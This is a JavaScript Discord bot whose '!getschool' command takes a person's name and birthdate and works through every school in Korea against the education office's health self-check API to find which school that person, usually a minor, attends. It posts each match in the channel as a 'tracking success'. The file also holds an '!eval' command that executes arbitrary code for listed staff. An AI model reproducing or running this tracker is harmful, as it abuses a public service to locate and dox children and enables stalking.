const axios = require(`axios`).default;
const fs = require(`fs`);
const crypto = require(`crypto`);
const discord = require(`discord.js`);
const roleIDList = [];
const evalstaff = [];
const client = new discord.Client({
    intents: new discord.Intents(32767)
});
const cityCodes = {"서울특별시": "sen", "부산광역시": "pen", "대구광역시": "dge", "인천광역시": "ice", "광주광역시": "gen", "대전광역시": "dje", "울산광역시": "use", "세종특별자치시": "sje", "경기도": "goe", "강원도": "kwe", "충청북도": "cbe", "충청남도": "cne", "전라북도": "jbe", "전라남도": "jne", "경상북도": "gbe", "경상남도": "gne", "제주특별자치도": "jje"};
const cityNumCodes = {"서울특별시": "01", "부산광역시": "02", "대구광역시": "03", "인천광역시": "04", "광주광역시": "05", "대전광역시": "06", "울산광역시": "07", "세종특별자치시": "08", "경기도": "10", "강원도": "11", "충청북도": "12", "충청남도": "13", "전라북도": "14", "전라남도": "15", "경상북도": "16", "경상남도": "17", "제주특별자치도": "18"};
const TOKEN = "";
let trackCheck = false;

client.on(`ready`, () => {
    console.log(`Logged in as ${client.user.tag}`);
    client.user.setActivity("!getschool", {type: 'STREAMING'});
})

client.on(`messageCreate`, async (message) => {
    if (message.author.bot || message.channel == message.author.dmChannel) return;
    if (message.content.toLowerCase().startsWith(`!getschool `)) {
        if (trackCheck) return await message.channel.send({embeds: [new discord.MessageEmbed().setTitle("❌ 이미 트래커를 사용중인 유저가 있습니다.").setColor("RED")]});
        trackCheck = true;
        const name = message.content.split(" ")[1];
        const birth = message.content.split(" ")[2];
        var schoolLevel = birth.substring(0, 2);
        if (birth.length === 6 && !isNaN(birth) && 4 <= schoolLevel && schoolLevel <= 15 && birth.substring(2, 4) <= 12 && birth.substring(4, 6) <= 31) {
            await message.channel.send({"embeds": [new discord.MessageEmbed().setTitle("🛠️ 트래킹 준비 중...").setColor("BLUE")]});
            if (10 <= schoolLevel) schoolLevel = "초등학교";
            else if (schoolLevel <= 6) schoolLevel = "고등학교";
            else schoolLevel = "중학교";

            var schoolData = JSON.parse(fs.readFileSync("./schoolData.json").toString("utf8"));
            const schoolTasks = Object.keys(schoolData).filter(code => schoolData[code].name.includes(schoolLevel));

            var taskSuccess = 0;
            var schoolCode;

            if (schoolLevel == "초등학교") schoolCode = "2";
            else if (schoolLevel == "중학교") schoolCode = "3";
            else schoolCode == "4";
            const countEmbed = await message.channel.send({ embeds: [new discord.MessageEmbed().setTitle(`🛠️ 0/${Math.floor(schoolTasks.length / 300) + 1} 페이지 트래킹 중...`).setColor("BLUE")] });

            await Promise.all(schoolTasks.map(async function (task) {
                await new Promise(res => setTimeout(res, 20 * schoolTasks.indexOf(task)));
                if (Number.isInteger(schoolTasks.indexOf(task) / 300)) await countEmbed.edit({ embeds: [new discord.MessageEmbed().setTitle(`🛠️ ${schoolTasks.indexOf(task) / 300 + 1}/${Math.floor(schoolTasks.length / 300) + 1} 페이지 트래킹 중...`).setColor("BLUE")] });
                const schoolKeyData = await axios.get(`https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=${cityNumCodes[schoolData[task].city]}&schulCrseScCode=${schoolCode}&orgName=${encodeURIComponent(schoolData[task].name)}&loginType=school`, {
                    "headers": {
                        "accept": "application/json, text/plain, */*",
                        "accept-language": "en-US,en;q=0.9",
                        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                        "Host": "hcs.eduro.go.kr",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "x-requested-with": "XMLHttpRequest",
                        "Referer": "https://hcs.eduro.go.kr/",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
                    }
                }).catch(() => false);

                if (!schoolKeyData) return;

                const userData = await axios.post(`https://${cityCodes[schoolData[task].city]}hcs.eduro.go.kr/v2/findUser`, JSON.stringify({ "birthday": encrypt(birth), "loginType": "school", "name": encrypt(name), "orgCode": task, "searchKey": schoolKeyData.data.key, "stdntPNo": null }), {
                    "headers": {
                        "accept": "application/json, text/plain, */*",
                        "accept-language": "en-US,en;q=0.9",
                        "content-type": "application/json;charset=UTF-8",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-site",
                        "x-requested-with": "XMLHttpRequest",
                        "Referer": "https://hcs.eduro.go.kr/",
                        "Referrer-Policy": "strict-origin-when-cross-origin",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
                    }
                }).catch(() => ({ "status": 500 }));

                if (userData.status === 200) {
                    await message.channel.send({ embeds: [new discord.MessageEmbed().setTitle("✅ 트래킹 성공").setColor("GREEN").setDescription(`**${schoolData[task].city} ${schoolData[task].name}** 에서 **${name}** 님의 정보를 찾았습니다!`)] });
                    taskSuccess++;
                }
            }));

            if (taskSuccess) await message.channel.send({ embeds: [new discord.MessageEmbed().setTitle("✅ 트래킹 완료").setColor("GREEN").setDescription(`**${name}** 님의 정보를 ${taskSuccess}개 찾았습니다!`)] });
            else await message.channel.send({ embeds: [new discord.MessageEmbed().setTitle("❌ 트래킹 실패").setColor("RED").setDescription(`**${name}** 님의 정보를 찾지 못했습니다!`)] });
            await countEmbed.delete();
            trackCheck = false;
        }
        else {
            await message.channel.send({embeds: [new discord.MessageEmbed().setTitle("❌ 생년월일을 다시 확인해 주세요!").setColor("RED")]});
            trackCheck = false;
        }
    }

    if (message.content.startsWith("!eval ")) {
        if (!evalstaff.includes(message.author.id)) return;
        try {
            let code = message.content.split(" ")[1];
            let evaled = eval(code);
    
            if (!typeof evaled == "string") evaled = require("util").inspect(evaled);
            await message.channel.send(String(evaled), {code:"xl"});
        } catch (err) {
            await message.channel.send(String(err));
        }
    }
})

function hasRole(message, arr) {
    return arr.some(r => message.member.roles.cache.has(r))
}

function encrypt(str) {
    const publicKey = [
        '-----BEGIN PUBLIC KEY-----',
        'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU0aqi5u6',
        'sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ8o3FGqMzsMTNxr',
        '+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7yDzcfjfBs99K5xJEppHG0',
        'qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzOQExbQ4oDlZBv',
        '8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNNQQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHj',
        'JzGs9MMMWtQIDAQAB',
        '-----END PUBLIC KEY-----'
    ].join('\n');

    return crypto.publicEncrypt({
        'key': Buffer.from(publicKey, 'utf-8'),
        'padding': crypto.constants.RSA_PKCS1_PADDING
    }, Buffer.from(str, 'utf-8')).toString('base64');
}

client.login(TOKEN);
